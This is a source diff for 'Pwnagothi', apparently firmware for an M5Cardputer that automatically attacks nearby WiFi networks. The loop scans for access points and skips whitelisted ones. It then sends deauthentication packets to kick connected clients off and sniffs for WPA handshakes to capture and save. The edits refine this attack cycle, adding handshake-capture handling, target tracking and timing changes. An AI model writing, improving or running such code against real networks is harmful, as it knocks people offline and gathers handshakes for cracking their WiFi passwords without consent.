@@ -18,6 +18,23 @@ bool pwnagothiBegin(){
     if(!(WiFi.mode(WIFI_MODE_STA) && WiFi.scanNetworks(true, true))){
         return false;
     }   
+    setMood(1, "(o_o)", "3 seconds for auto mode start... ESC to cancel");
+    updateUi(true, false);
+    
+    uint32_t start = millis();
+    while(millis() - start < 3000){
+        M5.update();
+        M5Cardputer.update();
+        auto status = M5Cardputer.Keyboard.keysState();
+        for(auto i : status.word){
+            if(i=='`'){
+                setMood(1, "(^_^)", "Pwnagothi mode cancelled");
+                updateUi(true, false);
+                delay(5000);
+                return false;
+            }
+        }
+    }
     WiFi.scanNetworks(true, true);
     logMessage("Pwnagothi auto mode init!");
     uint16_t trash;
@@ -90,20 +107,24 @@ void parseMacFromWhitelist() {
 
 uint8_t wifiCheckInt = 0;
 
+uint8_t getWiFiCheckInt(){
+    return wifiCheckInt;
+}
+
 void pwnagothiLoop(){
     if(pwnagothiScan){
         logMessage("(<_>) Scanning..");
         setMood(1, "(<_>)", "Scanning..");
         updateUi(true, false);
         WiFi.scanNetworks(false);
-        delayWithUI(50);
+        delay(50);
         if((WiFi.scanComplete()) >= 0){
             wifiCheckInt = 0;
             pwnagothiScan = false;
             logMessage("(*_*) Scan compleated proceding to attack!");
             setMood(1, "(*_*)", "Scan compleated proceding to attack!");
             updateUi(true, false);
-            delayWithUI(100);
+            delay(100);
         }
     }
     else{
@@ -111,7 +132,7 @@ void pwnagothiLoop(){
         if(!WiFi.SSID(0)){
             logMessage("('_') No networks found. Waiting and retrying");
             updateUi(true, false);
-            delayWithUI(50);
+            delay(50);
             pwnagothiScan = true;
             return;
         }
@@ -123,10 +144,13 @@ void pwnagothiLoop(){
             return;
         }
         attackVector = WiFi.SSID(wifiCheckInt);
+        setTargetAP(WiFi.BSSID(wifiCheckInt));
+        logMessage("Status: wifiCheckInt: " + String(wifiCheckInt) + " of " + String(WiFi.scanComplete()));
+        logMessage("Attack vector: " + WiFi.SSID(wifiCheckInt) + " BSSID: " + WiFi.BSSIDstr(wifiCheckInt) + " Ch: " + String(WiFi.channel(wifiCheckInt)) + " RSSI: " + String(WiFi.RSSI(wifiCheckInt)));
         setMood(1, "(@_@)", "Oh, hello " + attackVector + ", don't hide - I can still see you!!!");
         logMessage("(@_@) " + String("Oh, hello ") + attackVector + ", don't hide - I can still see you!!!");
         updateUi(true, false);
-        delayWithUI(10);
+        delay(1000);
         uint16_t whitelistSize;
         String* whitelistParsed = parseWhitelist(whitelistSize);
         logMessage("Size of whiletist: " + String(sizeof(whitelistParsed)));
@@ -136,7 +160,7 @@ void pwnagothiLoop(){
                 setMood(1, "(x_x)", "Well, " + attackVector + " you are safe. For now... NEXT ONE PLEASE!!!");
                 logMessage("(x_x) " + String("Well, ") + attackVector + " you are safe. For now... NEXT ONE PLEASE!!!");
                 updateUi(true, false);
-                delayWithUI(50);
+                delay(5000);
                 wifiCheckInt++;
                 return;
             }
@@ -155,10 +179,10 @@ void pwnagothiLoop(){
         logMessage("Waiting for clients to connect to " + attackVector);
         while(true){
             get_clients_list(clients, clientLen);
-            if (millis() - startTime > 20000) { // 20 seconds timeout
-                setMood(1, "(~_~)", "Attack failed: Timeout waiting for handshake.");
-                logMessage("(~_~) Attack failed: Timeout waiting for handshake.");
-                SnifferEnd();
+            if (millis() - startTime > 10000) { // 10 seconds timeout
+                setMood(1, "(~_~)", "Attack failed: Timeout waiting for clients.");
+                logMessage("(~_~) Attack failed: Timeout waiting for clients.");
+                esp_wifi_set_promiscuous(false);
                 updateUi(true, false);
                 delay(100);
                 wifiCheckInt++;
@@ -168,11 +192,9 @@ void pwnagothiLoop(){
                 logMessage("Client count: " + String(clientLen));
                 setMood(1, "(d_b)", "I think that " + clients[i] + " doesn't need an internet..." );
                 logMessage("WiFi BSSIS is: " + WiFi.BSSIDstr(wifiCheckInt));
-                logMessage("Client BSSID is: "+ clients[clientLen]);
-                logMessage("(d_b) I think that " + clients[i] + "doesn't need an internet...");
+                logMessage("Client BSSID is: "+ clients[clientLen -1 ]);
                 updateUi(true, false);
-                delayWithUI(80);
-                //stopClientSniffing();
+                delay(80);
                 esp_wifi_set_promiscuous(false);
                 break;
             }
@@ -181,7 +203,7 @@ void pwnagothiLoop(){
         setMood(1, "(O_o)", "Well, well, well  " + clients[i] + " you're OUT!!!" );
         logMessage("(O_o) Well, well, well  " + clients[i] + " you're OUT!!!");
         updateUi(true, false);
-        if(send_deauth_packets(clients[i], 200)){
+        if(send_deauth_packets(clients[i], 50)){
             logMessage("Deauth succesful");
         }
         else{
@@ -191,7 +213,27 @@ void pwnagothiLoop(){
         SnifferBegin(targetChanel);
         while(true){
             SnifferLoop();
-            if (millis() - startTime1 > 20000) { // 20 seconds timeout
+            if (SnifferGetClientCount() > currentCount) {
+                while (SnifferPendingPackets() > 0) {
+                    SnifferLoop();
+                    updateUi(true, false);
+                }
+                setMood(1, "(^_^)", "Got new handshake!!!" );
+                logMessage("(^_^) Got new handshake!!!");
+                Sound(1000, 500, true);
+                delay(500);
+                Sound(1500, 200, true);
+                SnifferEnd();
+                updateUi(true, false);
+                addToWhitelist(attackVector);
+                pwned_ap++;
+                sessionCaptures++;
+                wifiCheckInt++;
+                saveSettings();
+                delay(5000);
+                break;
+            }
+            if (millis() - startTime1 > 10000) { // 10 seconds timeout
                 setMood(1, "(~_~)", "Attack failed: Timeout waiting for handshake.");
                 logMessage("(~_~) Attack failed: Timeout waiting for handshake.");
                 SnifferEnd();
@@ -200,38 +242,13 @@ void pwnagothiLoop(){
                 wifiCheckInt++;
                 break;
             }
-            updateUi(true, false);
-            delayWithUI(10);
-            if (SnifferGetClientCount() > currentCount) {
-                setMood(1, "(^_^)", "Got new handshake!!!" );
-                logMessage("(^_^) Got new handshake!!!");
-                SnifferEnd();
-                updateUi(true, false);
-                addToWhitelist(attackVector);
-                pwned_ap++;
-                sessionCaptures++;
-                wifiCheckInt++;
-                saveSettings();
-                delayWithUI(50);
-                break;
-            }
         }
+        clearTargetAP();
     }
-    setMood(1, "(>_<)", "Waiting 3 seconds for next attack...");
-    logMessage("(>_<) Waiting 3 seconds for next attack...");
+    setMood(1, "(z_z)", "I'll nap for 3 seconds...");
+    logMessage("(z_z) I'll nap for 3 seconds");
     updateUi(true, false);
-    delayWithUI(30);
-}
-
-void delayWithUI(uint16_t delayTime){
-    logMessage("Waiting " + String(delayTime) + "ms");
-    for(uint16_t timer; timer<=delayTime; timer++){
-        M5.update();
-        M5Cardputer.update();
-        sleepFunction();
-        updateUi(true, false);
-        delay(1);  // Delay for 1 ms to avoid blocking the UI
-    }
+    delay(3000);
 }
 
 void removeItemFromWhitelist(String valueToRemove) {
